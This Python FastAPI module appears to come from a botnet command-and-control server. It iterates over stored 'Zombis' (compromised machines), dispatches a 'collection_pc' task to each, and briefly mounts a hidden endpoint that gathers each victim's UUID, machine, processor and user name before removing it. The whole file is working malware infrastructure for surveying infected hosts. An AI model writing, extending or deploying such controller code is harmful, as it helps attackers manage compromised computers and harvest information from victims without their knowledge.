from core.loader import tasks, app
from database.models import Zombis
from type import TypeTasks
from fastapi import APIRouter
from pydantic import BaseModel
import asyncio

class InfoPcForm(BaseModel):
    uuid: str
    name_short: str
    machine: str
    processor: str
    user: str

def prioritize_router(router: APIRouter):
    # Добавляем все маршруты из роутера на первое место
    for route in router.routes:
        app.router.routes.insert(0, route)

def remove_router_from_app(router_to_remove: APIRouter):
    # Удаляем все маршруты этого роутера
    app.router.routes = [route for route in app.router.routes 
                       if not (hasattr(route, 'router') and route.router == router_to_remove)]

async def check_on(callback, args):
    dynamic_router_info=APIRouter(prefix='/info', tags=['info_zombie'])
    list_on_pc=[]
    
    @dynamic_router_info.post('/collection_pc')
    async def get_info_pc(form: InfoPcForm):
        list_on_pc.append(form.model_dump())
        return {"status": "received"}
    
    prioritize_router(dynamic_router_info)
    zombies=await Zombis.all()
    
    for zombie in zombies:
        await tasks.add_task(TypeTasks.collection_pc, zombie=zombie)
    
    await asyncio.sleep(2)
    remove_router_from_app(dynamic_router_info)
    await callback(list_on_pc, **args)